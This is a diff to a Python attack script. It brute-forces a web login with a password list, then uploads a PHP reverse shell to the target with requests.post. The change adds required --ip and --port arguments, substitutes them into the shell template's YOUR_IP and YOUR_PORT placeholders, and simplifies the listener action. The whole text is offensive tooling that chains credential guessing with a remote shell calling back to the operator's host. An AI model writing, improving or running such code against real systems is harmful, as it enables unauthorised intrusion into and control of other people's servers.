@@ -14,7 +14,10 @@ def brute_force_login(target_url, username, password_list_file):
             return password  # Return found password
     return None
 
-def inject_reverse_shell(upload_url, reverse_shell_payload):
+def inject_reverse_shell(upload_url, reverse_shell_template, ip, port):
+    # Replace placeholders with user-specified values
+    reverse_shell_payload = reverse_shell_template.replace('YOUR_IP', ip).replace('YOUR_PORT', str(port))
+    
     response = requests.post(upload_url, data={'file': reverse_shell_payload})
 
     if response.status_code == 200:
@@ -32,23 +35,21 @@ def main():
     parser.add_argument('--target', required=True, help='Target URL for login (e.g., http://target-url/login)')
     parser.add_argument('--username', required=True, help='Target username')
     parser.add_argument('--passwords', required=True, help='Path to password list file (e.g., passwords.txt)')
-    parser.add_argument('--port', type=int, help='Port for the reverse shell listener')
+    parser.add_argument('--ip', required=True, help='IP address for the reverse shell connection')
+    parser.add_argument('--port', type=int, required=True, help='Port for the reverse shell listener')
     
     args = parser.parse_args()
 
     if args.action == 'brute':
         found_password = brute_force_login(args.target, args.username, args.passwords)
-        if found_password and args.port:
+        if found_password:
             # Prepare the reverse shell payload
-            with open('php_reverse_shell.php', 'r') as file:
-                reverse_shell_payload = file.read()
-            inject_reverse_shell(args.target, reverse_shell_payload)
+            with open('reverse_shell.php', 'r') as file:
+                reverse_shell_template = file.read()
+            inject_reverse_shell(args.target, reverse_shell_template, args.ip, args.port)
     
     elif args.action == 'listen':
-        if args.port:
-            setup_listener(args.port)
-        else:
-            print("Port must be specified for listener.")
-    
+        setup_listener(args.port)
+
 if __name__ == "__main__":
     main()
